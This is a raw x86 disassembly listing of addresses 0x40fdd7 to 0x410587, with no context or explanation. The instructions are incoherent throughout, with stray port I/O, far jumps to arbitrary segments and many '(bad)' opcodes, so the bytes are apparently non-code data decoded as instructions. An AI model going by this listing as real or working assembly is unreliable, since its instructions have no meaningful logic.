  40fdd7:	push   edx
  40fdd8:	and    dl,BYTE PTR [esi]
  40fdda:	pop    esp
  40fddb:	outs   dx,DWORD PTR ds:[esi]
  40fddc:	bound  ebp,QWORD PTR ds:0x409a8170
  40fde2:	pop    ebp
  40fde3:	inc    ebx
  40fde4:	pop    edx
  40fde5:	cdq    
  40fde6:	xor    al,0xc2
  40fde8:	push   ebp
  40fde9:	adc    eax,0x35a43efc
  40fdee:	add    al,0x83
  40fdf0:	lahf   
  40fdf1:	out    dx,al
  40fdf2:	mov    al,0xe7
  40fdf4:	out    0x22,eax
  40fdf6:	push   ss
  40fdf7:	jg     0x40fe56
  40fdf9:	push   es
  40fdfa:	lahf   
  40fdfb:	jle    0x40fe36
  40fdfd:	popf   
  40fdfe:	das    
  40fdff:	neg    DWORD PTR [esi-0x7a62432f]
  40fe05:	shl    dl,1
  40fe07:	jbe    0x40fdc0
  40fe09:	sub    dl,BYTE PTR [ebp+0x5b4c4a09]
  40fe0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe10:	test   eax,0xf67d6281
  40fe15:	dec    esi
  40fe16:	xor    DWORD PTR [ebx-0x6b0aa140],ecx
  40fe1c:	pop    ebp
  40fe1d:	push   0x96473b87
  40fe22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe23:	dec    edx
  40fe24:	shr    BYTE PTR [esi+ebp*1-0x3e6509c8],cl
  40fe2b:	or     eax,0x5fe502e2
  40fe30:	xchg   esp,eax
  40fe31:	lods   al,BYTE PTR ds:[esi]
  40fe32:	and    BYTE PTR [esi-0x704818c],0xeb
  40fe39:	push   es
  40fe3a:	sar    DWORD PTR [edi+0xeff11f9],0x1c
  40fe41:	add    ah,BYTE PTR [ebp-0x53]
  40fe44:	jnp    0x40fe97
  40fe46:	mov    bl,0x85
  40fe48:	retf   0x20af
  40fe4b:	jl     0x40fde1
  40fe4d:	lods   eax,DWORD PTR ds:[esi]
  40fe4e:	pop    es
  40fe4f:	pop    ds
  40fe50:	pop    ss
  40fe51:	and    BYTE PTR [eax-0x74],0xc8
  40fe55:	inc    ecx
  40fe56:	neg    BYTE PTR [esp+edx*4]
  40fe59:	add    ch,bl
  40fe5b:	repz ficomp DWORD PTR [esi]
  40fe5e:	xor    al,0x1d
  40fe60:	cmp    DWORD PTR [esp+edi*4-0x1],edx
  40fe64:	cmp    bl,dh
  40fe66:	cwde   
  40fe67:	loope  0x40fe48
  40fe69:	lock mov al,0xad
  40fe6c:	inc    esi
  40fe6d:	retf   
  40fe6e:	jns    0x40fee7
  40fe70:	scas   al,BYTE PTR es:[edi]
  40fe71:	add    BYTE PTR ds:0x641f4161,ch
  40fe77:	xchg   esi,eax
  40fe78:	jae    0x40fe40
  40fe7a:	leave  
  40fe7b:	ds retf 0x5c57
  40fe7f:	ds mov esi,0xf20e85cc
  40fe85:	dec    ecx
  40fe86:	pop    ebx
  40fe87:	pop    DWORD PTR [edi+0x532331e]
  40fe8d:	ret    
  40fe8e:	adc    ebx,ebx
  40fe90:	retf   
  40fe91:	dec    ebx
  40fe92:	push   esi
  40fe93:	push   esi
  40fe94:	ds hlt 
  40fe96:	push   esp
  40fe97:	outs   dx,DWORD PTR ds:[esi]
  40fe98:	test   edi,edx
  40fe9a:	sub    ebp,ebx
  40fe9c:	ror    DWORD PTR [eax+0x2e274906],1
  40fea2:	fstp   DWORD PTR [esi+0x2a8df8a3]
  40fea8:	push   ds
  40fea9:	adc    eax,DWORD PTR [eax+0x1be3f0e5]
  40feaf:	sahf   
  40feb0:	adc    ah,dl
  40feb2:	jo     0x40fed0
  40feb4:	(bad)  
  40feb5:	xor    esp,ebx
  40feb7:	rol    BYTE PTR [edi+0x3284175b],0x5c
  40febe:	jg     0x40ff21
  40fec0:	pop    es
  40fec1:	push   0x13
  40fec3:	ret    0xf1ea
  40fec6:	and    al,0xa3
  40fec8:	leave  
  40fec9:	lds    esp,FWORD PTR [ebx+ecx*4-0x2af6cc90]
  40fed0:	inc    eax
  40fed1:	ins    BYTE PTR es:[edi],dx
  40fed2:	es js  0x40ff3e
  40fed5:	nop
  40fed6:	sub    BYTE PTR [edx],dl
  40fed8:	fdiv   DWORD PTR [esi+0x32564afa]
  40fede:	mov    WORD PTR [ecx-0x119dd2bb],gs
  40fee4:	retf   
  40fee5:	ret    0x8149
  40fee8:	sub    ch,BYTE PTR [edi+0x5409c2bb]
  40feee:	mov    ch,BYTE PTR [ebx+0x20]
  40fef1:	ret    0x3d0f
  40fef4:	dec    ebx
  40fef5:	or     eax,0x4014dceb
  40fefa:	test   ebp,0x4fe241c9
  40ff00:	jb     0x40fefd
  40ff02:	gs mov ch,0x57
  40ff05:	sub    BYTE PTR [ecx-0x1687d8e8],cl
  40ff0b:	cwde   
  40ff0c:	sbb    bl,ch
  40ff0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff0f:	inc    ecx
  40ff10:	dec    ecx
  40ff11:	js     0x40ff6f
  40ff13:	clc    
  40ff14:	cwde   
  40ff15:	cld    
  40ff16:	dec    edi
  40ff17:	lea    ebp,[edi+0x177d8e63]
  40ff1d:	fs jl  0x40ff21
  40ff20:	je     0x40fef2
  40ff22:	mov    edi,0x52934f2c
  40ff27:	test   DWORD PTR [edx+ecx*8],ebp
  40ff2a:	push   esi
  40ff2b:	mov    eax,0x758f8f8e
  40ff30:	and    ch,ah
  40ff32:	or     eax,0x2fac3a36
  40ff37:	out    0xb6,al
  40ff39:	cmp    BYTE PTR [esi+0x3d],0xe3
  40ff3d:	stos   DWORD PTR es:[edi],eax
  40ff3e:	cld    
  40ff3f:	mov    ah,0xce
  40ff41:	fucomp st(3)
  40ff43:	push   ebx
  40ff44:	push   ecx
  40ff45:	rcr    DWORD PTR [esi-0xd],cl
  40ff48:	cmp    DWORD PTR [edi],esp
  40ff4a:	outs   dx,BYTE PTR ds:[esi]
  40ff4b:	shl    BYTE PTR [ebx+0x24],cl
  40ff4e:	adc    BYTE PTR [ecx+0x27],cl
  40ff51:	sub    BYTE PTR [esi],cl
  40ff53:	lock mov eax,ds:0x5bb3a587
  40ff59:	push   cs
  40ff5a:	inc    edx
  40ff5b:	or     DWORD PTR [edx+0x32],0x259a6d64
  40ff62:	inc    edx
  40ff63:	push   ebx
  40ff64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff65:	clc    
  40ff66:	cwde   
  40ff67:	leave  
  40ff68:	cmp    BYTE PTR [esi-0x66],dl
  40ff6b:	adc    DWORD PTR [ebx+eax*8+0x9],ebp
  40ff6f:	lods   al,BYTE PTR ds:[esi]
  40ff70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff71:	call   0x8ac:0xa4659786
  40ff78:	nop
  40ff79:	mov    dh,BYTE PTR [ebp+0x5901fe7a]
  40ff7f:	arpl   WORD PTR ss:[esi+0x45c3bfa0],sp
  40ff86:	xchg   ebp,eax
  40ff87:	pushf  
  40ff88:	(bad)  
  40ff89:	push   0x4b
  40ff8b:	pusha  
  40ff8c:	mov    ebp,0x1332527b
  40ff91:	dec    esp
  40ff92:	inc    esi
  40ff93:	pop    esi
  40ff94:	clc    
  40ff95:	pop    es
  40ff96:	sar    BYTE PTR [eax+eiz*1-0x2],cl
  40ff9a:	ins    DWORD PTR es:[edi],dx
  40ff9b:	lock in eax,0x3d
  40ff9e:	outs   dx,BYTE PTR ds:[esi]
  40ff9f:	or     al,0xb5
  40ffa1:	dec    edi
  40ffa2:	test   al,0xf8
  40ffa4:	jnp    0x40fff9
  40ffa6:	fwait
  40ffa7:	mov    ch,0x19
  40ffa9:	ret    
  40ffaa:	rol    BYTE PTR [ecx+0x60],1
  40ffad:	xchg   ebp,eax
  40ffae:	addr16 add ecx,edi
  40ffb1:	std    
  40ffb2:	repz mov edi,0xdcc84644
  40ffb8:	aam    0xa6
  40ffba:	test   BYTE PTR [ebx+0xedc03a7],bh
  40ffc0:	retf   
  40ffc1:	js     0x40ff92
  40ffc3:	xchg   ebp,eax
  40ffc4:	or     DWORD PTR [esi+0x3a],ecx
  40ffc7:	iret   
  40ffc8:	push   esp
  40ffc9:	xchg   ebx,eax
  40ffca:	cmc    
  40ffcb:	jge    0x410042
  40ffcd:	mov    ch,0x86
  40ffcf:	pop    edx
  40ffd0:	jmp    0x5caf7d6c
  40ffd5:	mov    dh,BYTE PTR [ecx+0x68b892f2]
  40ffdb:	jb     0x41000b
  40ffdd:	jno    0x40ffeb
  40ffdf:	jbe    0x40ff9a
  40ffe1:	cmp    eax,0xb89b11db
  40ffe6:	adc    eax,0xe7b317ed
  40ffeb:	cwde   
  40ffec:	repz arpl WORD PTR [ebp-0x54],ax
  40fff0:	and    BYTE PTR [eax],dl
  40fff2:	push   cs
  40fff3:	and    al,0x7e
  40fff5:	(bad)  
  40fff6:	xor    ebx,edx
  40fff8:	mov    esp,0xbfb74ac5
  40fffd:	mov    bl,0x51
  40ffff:	dec    esi
  410000:	jecxz  0x40ffa5
  410002:	push   cs
  410003:	xor    DWORD PTR [ebp+esi*4-0x5a719501],edi
  41000a:	dec    esi
  41000b:	sub    bh,cl
  41000d:	jmp    0x3f26fb2b
  410012:	pushf  
  410013:	jae    0x410026
  410015:	out    dx,eax
  410016:	stos   BYTE PTR es:[edi],al
  410017:	lods   al,BYTE PTR ds:[esi]
  410018:	push   cs
  410019:	test   al,0xd4
  41001b:	pop    esp
  41001c:	fadd   QWORD PTR [ebx+0x2cad880e]
  410022:	data16 sbb dl,BYTE PTR [edx]
  410025:	repnz add al,0x75
  410028:	retf   0x3222
  41002b:	mov    edx,0x2ed4bc01
  410030:	or     edx,edx
  410032:	mov    eax,ds:0xe9dd3224
  410037:	stos   BYTE PTR es:[edi],al
  410038:	dec    ecx
  410039:	das    
  41003a:	fistp  DWORD PTR [ebx]
  41003c:	(bad)  
  41003d:	push   0xffffff8e
  41003f:	test   ebx,esp
  410041:	sbb    BYTE PTR [edi+edx*1+0x280c5f5f],dh
  410048:	test   al,0xaf
  41004a:	fsubr  QWORD PTR [eax+0x23]
  41004d:	sub    bl,0x92
  410050:	fistp  WORD PTR [edx]
  410052:	outs   dx,DWORD PTR ds:[esi]
  410053:	(bad)  
  410054:	xchg   ecx,eax
  410055:	sub    bl,BYTE PTR [edi]
  410057:	inc    eax
  410058:	xlat   BYTE PTR ds:[ebx]
  410059:	in     al,dx
  41005a:	mov    eax,0x7212d23a
  41005f:	push   cs
  410060:	dec    eax
  410061:	pop    ss
  410062:	out    0xae,eax
  410064:	in     eax,dx
  410065:	rcr    BYTE PTR [edx+0x49],0xfb
  410069:	(bad)  
  41006a:	clc    
  41006b:	aad    0x29
  41006d:	pusha  
  41006e:	inc    esi
  41006f:	inc    eax
  410070:	jp     0x410035
  410072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410073:	fbstp  TBYTE PTR [edi]
  410075:	sub    BYTE PTR [esi-0x6f],dl
  410078:	pop    edi
  410079:	fistp  QWORD PTR [edi+0x7e9cf7ed]
  41007f:	jb     0x41005c
  410081:	out    dx,eax
  410082:	pop    edx
  410083:	adc    DWORD PTR [ebx-0x12939e3],esi
  410089:	enter  0xb710,0x26
  41008d:	xlat   BYTE PTR ds:[ebx]
  41008e:	push   eax
  41008f:	lods   al,BYTE PTR ds:[esi]
  410090:	dec    ecx
  410091:	or     edx,DWORD PTR [ebx+0x5e]
  410094:	ret    0x4a27
  410097:	xlat   BYTE PTR ds:[ebx]
  410098:	and    bl,al
  41009a:	or     al,0x58
  41009c:	cmp    eax,esi
  41009e:	jmp    0xe0a1:0xcf748319
  4100a5:	pushf  
  4100a6:	fidiv  WORD PTR [ecx-0x3a]
  4100a9:	dec    ebx
  4100aa:	sub    eax,edi
  4100ac:	in     al,0x1b
  4100ae:	out    dx,eax
  4100af:	xor    DWORD PTR [ebp+ebp*8+0x258ecede],ebx
  4100b6:	adc    al,BYTE PTR [esp+edi*2-0x41]
  4100ba:	ins    BYTE PTR es:[edi],dx
  4100bb:	or     DWORD PTR [ebp-0x20],esi
  4100be:	imul   edi,DWORD PTR [ecx+esi*2-0x60],0xffffff9e
  4100c3:	sbb    al,0xf9
  4100c5:	add    al,0xf4
  4100c7:	out    0x9d,eax
  4100c9:	bound  esi,QWORD PTR [esi-0x79906b33]
  4100cf:	lea    eax,[ebx-0x424cfe2c]
  4100d5:	js     0x410089
  4100d7:	jge    0x410102
  4100d9:	js     0x4100cf
  4100db:	in     al,0x96
  4100dd:	sahf   
  4100de:	adc    ebx,esp
  4100e0:	cmp    al,0xf3
  4100e2:	or     edx,edi
  4100e4:	jne    0x410108
  4100e6:	out    0x73,eax
  4100e8:	xor    BYTE PTR [esp+eax*8-0x49],dh
  4100ec:	inc    ebx
  4100ed:	loopne 0x41011e
  4100ef:	aas    
  4100f0:	cwde   
  4100f1:	lahf   
  4100f2:	inc    ebx
  4100f3:	xor    ebp,DWORD PTR [ecx+ecx*4+0x1d]
  4100f7:	sbb    eax,0x2ff31d48
  4100fc:	call   0xb111:0x54508973
  410103:	pop    esp
  410104:	inc    edi
  410105:	adc    bl,BYTE PTR [eax+0x6a]
  410108:	test   al,0xc6
  41010a:	rol    BYTE PTR [edi+edi*2],cl
  41010d:	cmp    al,al
  41010f:	addr16 xchg ebp,eax
  410111:	dec    esp
  410112:	lods   eax,DWORD PTR ds:[esi]
  410113:	mov    esp,0x99f6baf
  410118:	xor    eax,0x7b9aafdf
  41011d:	fnsave [ecx]
  41011f:	or     DWORD PTR [ecx+0x69a39d3],eax
  410125:	in     eax,0xd0
  410127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410128:	neg    bh
  41012a:	lahf   
  41012b:	cmp    DWORD PTR [ecx+0x3d],edi
  41012e:	xchg   ecx,eax
  41012f:	cs and esi,esp
  410132:	int3   
  410133:	push   ecx
  410134:	cmp    al,0x97
  410136:	in     eax,dx
  410137:	mov    esp,0x2bea9bd
  41013c:	mov    bh,0x9e
  41013e:	inc    edx
  41013f:	ins    DWORD PTR es:[edi],dx
  410140:	call   0xc0929a65
  410145:	push   esp
  410146:	arpl   WORD PTR [ebx],ax
  410148:	inc    ebp
  410149:	loope  0x4101c2
  41014b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41014c:	fnstsw ax
  41014e:	push   edi
  41014f:	aad    0x52
  410151:	inc    ecx
  410152:	frstor [ebx+esi*2]
  410155:	pushf  
  410156:	daa    
  410157:	cwde   
  410158:	into   
  410159:	sub    eax,0x65333b50
  41015e:	scas   al,BYTE PTR es:[edi]
  41015f:	mov    edi,0xf98e9b43
  410164:	and    BYTE PTR [edi+eiz*8-0x7f],bh
  410168:	rcr    BYTE PTR [esi-0x21],1
  41016b:	mov    bh,0xd7
  41016d:	(bad)
  410171:	test   DWORD PTR [edx+0x7946830e],0x98d7c965
  41017b:	push   edi
  41017c:	lahf   
  41017d:	or     BYTE PTR [esi+eiz*4],dh
  410180:	ficomp WORD PTR [ecx]
  410182:	or     dl,BYTE PTR [ebp+0x59]
  410185:	push   ds
  410186:	mov    edi,0xa8758eff
  41018b:	test   al,0x7e
  41018d:	push   cs
  41018e:	mov    eax,eax
  410190:	mov    ebx,0x5e32117a
  410195:	fild   WORD PTR [esi-0x13]
  410198:	or     eax,0xf1181c5f
  41019d:	push   0x20
  41019f:	pop    ss
  4101a0:	jmp    0x4101a4
  4101a2:	cdq    
  4101a3:	ud0    edx,edi
  4101a6:	int    0xd
  4101a8:	xor    eax,0xb2034d6b
  4101ad:	les    esi,FWORD PTR [ebx+0x1d]
  4101b0:	sbb    DWORD PTR [edx-0x4a40cb6a],ebp
  4101b6:	or     dh,BYTE PTR [edx+esi*4+0x8a7c22e]
  4101bd:	setno  BYTE PTR [ebx+0xa6910e7]
  4101c4:	sbb    ah,BYTE PTR [edi-0x1c]
  4101c7:	adc    DWORD PTR ds:0xd95b040e,0x6
  4101ce:	fs in  eax,0xe0
  4101d1:	mov    DWORD PTR [eax],ecx
  4101d3:	lea    esi,ds:0xd9140c41
  4101d9:	pusha  
  4101da:	popf   
  4101db:	shr    DWORD PTR [esi],0x5f
  4101de:	test   dl,bl
  4101e0:	les    eax,FWORD PTR [edi-0x6b]
  4101e3:	in     al,0x3
  4101e5:	ins    BYTE PTR es:[edi],dx
  4101e6:	xor    esi,ebp
  4101e8:	and    bl,cl
  4101ea:	pop    ebx
  4101eb:	sbb    ecx,eax
  4101ed:	push   eax
  4101ee:	jge    0x410263
  4101f0:	push   ss
  4101f1:	mov    ch,al
  4101f3:	lods   al,BYTE PTR ds:[esi]
  4101f4:	in     al,dx
  4101f5:	pop    ebp
  4101f6:	mov    esi,0x937d4ad8
  4101fb:	or     DWORD PTR [ecx+esi*2-0x53],esp
  4101ff:	retf   
  410200:	mov    ah,0xb1
  410202:	push   ebx
  410203:	stc    
  410204:	out    0x0,eax
  410206:	stos   DWORD PTR es:[edi],eax
  410207:	pusha  
  410208:	mov    esi,0x7a7bc25c
  41020d:	push   esp
  41020e:	or     edi,ebp
  410210:	or     ebp,ebp
  410212:	lea    ebx,[ebx+0x3d7d232b]
  410218:	and    eax,0xd21d89d0
  41021d:	cld    
  41021e:	cmovg  esp,DWORD PTR [ecx+0x3d]
  410222:	loop   0x4101f2
  410224:	sbb    esp,DWORD PTR [edi+ebp*8-0x23fd891d]
  41022b:	add    eax,0x324e1ddb
  410230:	jbe    0x4101de
  410232:	into   
  410233:	push   cs
  410234:	mov    esi,0xa86bc915
  410239:	sbb    BYTE PTR [esi+0x1f],0xa9
  41023d:	mov    dl,0xa4
  41023f:	int    0xe5
  410241:	sub    ebp,DWORD PTR [eax]
  410243:	add    DWORD PTR [ebp-0x48ab1c4],eax
  410249:	xor    bl,BYTE PTR [edi]
  41024b:	adc    bh,BYTE PTR [ebp+0x4a]
  41024e:	sub    esp,ebx
  410250:	(bad)  
  410251:	repnz xchg edi,eax
  410253:	outs   dx,DWORD PTR ds:[esi]
  410254:	stos   BYTE PTR es:[edi],al
  410255:	adc    al,0xd3
  410257:	dec    esi
  410258:	sbb    esi,DWORD PTR [ecx+0xcb19012]
  41025e:	call   0xf9aac5e1
  410263:	mov    bl,0x40
  410265:	cmp    al,0x70
  410267:	(bad)  
  410268:	sbb    ecx,ebp
  41026a:	push   ds
  41026b:	xchg   cl,ch
  41026d:	jecxz  0x410243
  41026f:	and    al,0x70
  410271:	gs iret 
  410273:	das    
  410274:	pop    edi
  410275:	xchg   ebx,eax
  410276:	in     eax,0xcd
  410278:	popf   
  410279:	outs   dx,BYTE PTR ds:[esi]
  41027a:	and    ebx,ecx
  41027c:	xchg   DWORD PTR [ebp+esi*1+0xfb42f71],edi
  410283:	leave  
  410284:	test   DWORD PTR [edx+eax*1+0x1d89c966],eax
  41028b:	outs   dx,BYTE PTR ds:[esi]
  41028c:	das    
  41028d:	sbb    DWORD PTR [edx-0x91c4c50],edi
  410293:	inc    ebx
  410294:	jl     0x41024f
  410296:	mov    DWORD PTR [ecx],ebp
  410298:	ret    
  410299:	mov    al,ds:0x721b9a89
  41029e:	sub    dh,bl
  4102a0:	std    
  4102a1:	xchg   DWORD PTR [edx+0x643ed375],edx
  4102a7:	mov    ds:0xbaf988fc,al
  4102ac:	sar    BYTE PTR [eax+0x23],0xb7
  4102b0:	cmp    eax,0x8a6e062d
  4102b5:	jno    0x4102b2
  4102b7:	icebp  
  4102b8:	mul    edi
  4102ba:	ins    BYTE PTR es:[edi],dx
  4102bb:	cmp    al,0xd6
  4102bd:	in     eax,0x9c
  4102bf:	stos   DWORD PTR es:[edi],eax
  4102c0:	test   eax,0xc4cd5829
  4102c5:	jge    0x41024c
  4102c7:	iret   
  4102c8:	inc    sp
  4102ca:	sbb    BYTE PTR [edx-0x75],dl
  4102cd:	stc    
  4102ce:	pop    eax
  4102cf:	(bad)  
  4102d0:	out    dx,al
  4102d1:	int3   
  4102d2:	lahf   
  4102d3:	lock jmp ecx
  4102d6:	in     eax,dx
  4102d7:	xchg   esi,eax
  4102d8:	pop    ecx
  4102d9:	jp     0x4102f4
  4102db:	shl    BYTE PTR [edx],1
  4102dd:	es mov dh,0xf2
  4102e0:	adc    al,0x59
  4102e2:	test   eax,0x8a6d27e5
  4102e7:	fdecstp 
  4102e9:	xchg   ebx,eax
  4102ea:	and    ah,BYTE PTR [ebx]
  4102ec:	xchg   esi,eax
  4102ed:	adc    BYTE PTR [eax-0x36],ch
  4102f0:	jmp    0x2124:0x6be5cd00
  4102f7:	popf   
  4102f8:	sbb    BYTE PTR [ecx+ebx*8+0x1c],0x49
  4102fd:	push   cs
  4102fe:	les    esp,FWORD PTR [ecx+edx*8-0x36]
  410302:	iret   
  410303:	sub    BYTE PTR [eax+0x31bf03ab],al
  410309:	sbb    BYTE PTR [esi-0x8be8fdf],ch
  41030f:	dec    edx
  410310:	pop    es
  410311:	jb     0x4102a2
  410313:	fcmovu st,st(3)
  410315:	and    BYTE PTR [ebx-0x6f41d09e],bh
  41031b:	js     0x41034e
  41031d:	push   esi
  41031e:	add    edx,edx
  410320:	dec    esp
  410321:	adc    BYTE PTR [edi],bh
  410323:	push   ecx
  410324:	mov    ecx,0x6c880e02
  410329:	mov    BYTE PTR [edi+0x9],ah
  41032c:	loope  0x41039b
  41032e:	mov    dl,0xe3
  410330:	imul   ebx,DWORD PTR [esi+ecx*8],0x11af4ffb
  410337:	cmp    BYTE PTR [eax],0xb9
  41033a:	mov    ecx,0x80f2c04a
  41033f:	fsubr  st,st(0)
  410341:	fs inc esi
  410343:	(bad)
  410348:	sub    DWORD PTR [eax-0x2f37f9c1],0xbfc5e018
  410352:	les    eax,FWORD PTR [ecx-0x176fdc62]
  410358:	outs   dx,DWORD PTR ds:[esi]
  410359:	lods   eax,DWORD PTR ds:[esi]
  41035a:	lock sub DWORD PTR [esi-0x4e],0x3f
  41035f:	rcr    BYTE PTR [edx-0x11f6005a],0x8d
  410366:	push   edi
  410367:	rol    ah,1
  410369:	popa   
  41036a:	sbb    BYTE PTR [ebp-0x3f],dl
  41036d:	inc    eax
  41036e:	mov    dl,0x73
  410370:	dec    ebx
  410371:	dec    esp
  410372:	std    
  410373:	jge    0x410351
  410375:	xlat   BYTE PTR ds:[ebx]
  410376:	pushf  
  410377:	out    dx,eax
  410378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410379:	lods   eax,DWORD PTR ds:[esi]
  41037a:	mov    al,0x1e
  41037c:	rcr    BYTE PTR [ebx-0x347f7bb6],1
  410382:	and    dh,BYTE PTR [eax-0x601f814d]
  410388:	pop    eax
  410389:	xor    BYTE PTR [edi+0x44ffd5f6],0x1b
  410390:	fnstenv [ebp-0x7d]
  410393:	in     al,0x16
  410395:	icebp  
  410396:	stos   DWORD PTR es:[edi],eax
  410397:	test   DWORD PTR [edi],0x67318100
  41039d:	inc    edi
  41039e:	(bad)  
  41039f:	jmp    0xb7c42cf4
  4103a4:	or     DWORD PTR [eax-0x669f52b6],edi
  4103aa:	jecxz  0x410422
  4103ac:	std    
  4103ad:	out    dx,al
  4103ae:	lods   eax,DWORD PTR ds:[esi]
  4103af:	mov    ?,WORD PTR ds:0xeb44ff5b
  4103b5:	xchg   edi,eax
  4103b6:	push   edi
  4103b7:	mov    ch,0x6b
  4103b9:	out    0x7e,al
  4103bb:	popa   
  4103bc:	call   0x1e3f:0xbdcd8c80
  4103c3:	jmp    0xa2cf14be
  4103c8:	pop    ebp
  4103c9:	jecxz  0x410434
  4103cb:	add    DWORD PTR [esi],0x149aefc7
  4103d1:	rcr    BYTE PTR [ebx+0x22],cl
  4103d4:	xchg   ebp,eax
  4103d5:	jo     0x41038e
  4103d7:	xchg   esp,eax
  4103d8:	ins    BYTE PTR es:[edi],dx
  4103d9:	mov    eax,0xade87516
  4103de:	push   ebx
  4103df:	sub    al,ah
  4103e1:	scas   al,BYTE PTR es:[edi]
  4103e2:	call   0xfe64:0xbc4f7a96
  4103e9:	adc    al,0x9c
  4103eb:	xor    ch,0xa4
  4103ee:	dec    ecx
  4103ef:	inc    ebx
  4103f0:	and    eax,0xfaa1ccde
  4103f5:	pop    es
  4103f6:	outs   dx,DWORD PTR ds:[esi]
  4103f7:	fwait
  4103f8:	jl     0x4103be
  4103fa:	jae    0x4103f3
  4103fc:	and    dh,cl
  4103fe:	ds test al,0x65
  410401:	xor    DWORD PTR [ebx],eax
  410403:	cmp    al,0x30
  410405:	test   DWORD PTR [edi+0x2737d182],eax
  41040b:	cld    
  41040c:	inc    eax
  41040d:	xor    eax,0xdcfd3b15
  410412:	or     BYTE PTR [ebp-0x1c],al
  410415:	xchg   edx,eax
  410416:	mov    cl,0xe8
  410418:	hlt    
  410419:	jno    0x410488
  41041b:	add    esi,DWORD PTR [ebx+0x651a06d7]
  410421:	leave  
  410422:	add    DWORD PTR [edx+0x12],0xffffffc4
  410426:	sub    ah,BYTE PTR [ebx-0x19]
  410429:	imul   ecx,DWORD PTR [edx],0xb0614f16
  41042f:	popa   
  410430:	sbb    eax,0x6c981248
  410435:	test   BYTE PTR [edx-0x4861e1a3],ch
  41043b:	bound  edx,QWORD PTR [ebp-0x42]
  41043e:	push   ecx
  41043f:	xchg   esi,eax
  410440:	fsubr  QWORD PTR [edi+0x3f068202]
  410446:	xchg   esp,eax
  410447:	cs (bad) 
  410449:	gs sub eax,0x2410fc40
  41044f:	nop
  410450:	pop    edx
  410451:	add    DWORD PTR [eax],edx
  410453:	les    edx,FWORD PTR [esi-0x5ecfd2e0]
  410459:	call   0xfb3168a1
  41045e:	adc    DWORD PTR [esi],esi
  410460:	mov    edi,0x97fe3bbc
  410465:	dec    esp
  410466:	push   0x58
  410468:	mov    eax,0xeaa6c2ed
  41046d:	jmp    0x5f37:0xf717a5cd
  410474:	fwait
  410475:	iret   
  410476:	or     al,0x82
  410478:	mov    ?,WORD PTR [esi-0x2c]
  41047b:	aad    0x30
  41047d:	data16 mov ch,0x39
  410480:	and    eax,0xa83ac8de
  410485:	inc    BYTE PTR [ebp-0x3155731]
  41048b:	(bad)  
  41048c:	fmul   DWORD PTR [esi-0x13]
  41048f:	xchg   esi,eax
  410490:	mov    ebp,0x51c958cb
  410495:	push   cs
  410496:	jb     0x410437
  410498:	adc    ebx,DWORD PTR [ecx+0x1dfd664e]
  41049e:	jl     0x410467
  4104a0:	inc    edi
  4104a1:	push   ss
  4104a2:	jle    0x41043c
  4104a4:	mov    eax,ds:0xb0d54ba7
  4104a9:	out    0x49,al
  4104ab:	loop   0x41043a
  4104ad:	sbb    eax,0xf1aecf3f
  4104b2:	xlat   BYTE PTR ds:[ebx]
  4104b3:	xchg   ebx,eax
  4104b4:	outs   dx,BYTE PTR ds:[esi]
  4104b5:	rcr    ch,0xcc
  4104b8:	sar    BYTE PTR [edx],0x66
  4104bb:	in     eax,0x7b
  4104bd:	bound  ebp,QWORD PTR [ebp-0x375b294b]
  4104c3:	sbb    BYTE PTR [esp+ecx*2-0x6e],cl
  4104c7:	in     eax,0x24
  4104c9:	sbb    eax,eax
  4104cb:	daa    
  4104cc:	mov    edi,0x31392837
  4104d1:	fnsave [edi+0x23]
  4104d4:	rcl    bh,cl
  4104d6:	and    DWORD PTR [eax+0x1a],ebx
  4104d9:	(bad)  {k5}
  4104de:	push   cs
  4104df:	aad    0xa9
  4104e1:	add    eax,0xe6a7938f
  4104e6:	ret    
  4104e7:	lods   al,BYTE PTR ds:[esi]
  4104e8:	xchg   DWORD PTR [ebx-0x4a192f92],ecx
  4104ee:	jg     0x4104e4
  4104f0:	sub    al,0xdf
  4104f2:	sbb    eax,0x449887db
  4104f7:	inc    ebx
  4104f8:	sub    eax,esp
  4104fa:	out    0x9d,eax
  4104fc:	dec    esp
  4104fd:	jl     0x410514
  4104ff:	jmp    0x41054b
  410501:	xchg   BYTE PTR [esi-0x16],dl
  410504:	clc    
  410505:	xchg   DWORD PTR [ebp-0x4d],edi
  410508:	pop    es
  410509:	sub    eax,0xacdd6938
  41050e:	adc    ebp,DWORD PTR [edx]
  410510:	xchg   ecx,eax
  410511:	mov    esp,0xb2814607
  410516:	out    0x90,eax
  410518:	adc    al,BYTE PTR [ecx+0x6d019d9a]
  41051e:	adc    cl,bl
  410520:	xchg   edi,eax
  410521:	pop    ss
  410522:	or     BYTE PTR ds:0x7f28ec14,0xf
  410529:	ja     0x410536
  41052b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41052c:	and    eax,0x6932e677
  410531:	stos   BYTE PTR es:[di],al
  410533:	adc    BYTE PTR [edx-0x43bb01c],al
  410539:	test   DWORD PTR [eax-0x9],ecx
  41053c:	jp     0x410503
  41053e:	in     eax,0xde
  410540:	popa   
  410541:	xchg   ecx,eax
  410542:	hlt    
  410543:	dec    edi
  410544:	test   BYTE PTR [ebp+0x68f0a38c],bl
  41054a:	sub    BYTE PTR [ebp-0x7305eabd],cl
  410550:	in     eax,dx
  410551:	add    esp,DWORD PTR [ebx+0x4b]
  410554:	xchg   ebp,eax
  410555:	or     al,0x2e
  410557:	jns    0x410591
  410559:	cmovb  ebx,DWORD PTR [edx+ebp*1+0x52cc28f2]
  410561:	mov    cl,0x7e
  410563:	xor    ch,BYTE PTR [ebx-0x7a9a9622]
  410569:	out    dx,eax
  41056a:	push   es
  41056b:	dec    edi
  41056c:	(bad)  
  41056d:	fwait
  41056e:	cld    
  41056f:	dec    esp
  410570:	lods   al,BYTE PTR ds:[esi]
  410571:	xor    BYTE PTR ds:0xc4f9342f,al
  410577:	scas   eax,DWORD PTR es:[edi]
  410578:	fdivp  st(5),st
  41057a:	jecxz  0x410541
  41057c:	add    BYTE PTR [edi-0x76],bh
  41057f:	daa    
  410580:	adc    BYTE PTR [ecx-0x759eceb1],al
  410586:	leave  
  410587:	cmc    
